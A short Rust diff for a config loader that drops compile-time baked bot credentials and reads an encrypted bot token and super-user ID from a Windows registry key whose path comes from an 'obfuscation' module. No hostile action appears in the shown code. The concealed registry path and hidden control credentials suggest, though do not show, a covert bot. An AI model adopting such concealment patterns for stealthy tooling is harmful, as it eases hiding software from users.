@@ -9,21 +9,11 @@ pub struct AppConfig {
 }
 
 pub fn load() -> Result<AppConfig> {
-    let token = env!("BAKED_TOKEN");
-    let uid = env!("BAKED_UID");
-
-    if !token.is_empty() && !uid.is_empty() {
-        return Ok(AppConfig {
-            bot_token: token.to_owned(),
-            super_user_id: uid.parse().context("invalid BAKED_UID")?,
-        });
-    }
-
     let reg_path = obfuscation::registry_path();
     let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
     let key = hkcu
         .open_subkey(reg_path)
-        .context("cannot open registry key")?;
+        .context("cannot open registry key — run --install TOKEN UID first")?;
 
     let enc_token: String = key.get_value("Token").context("Token not in registry")?;
     let enc_uid: String = key
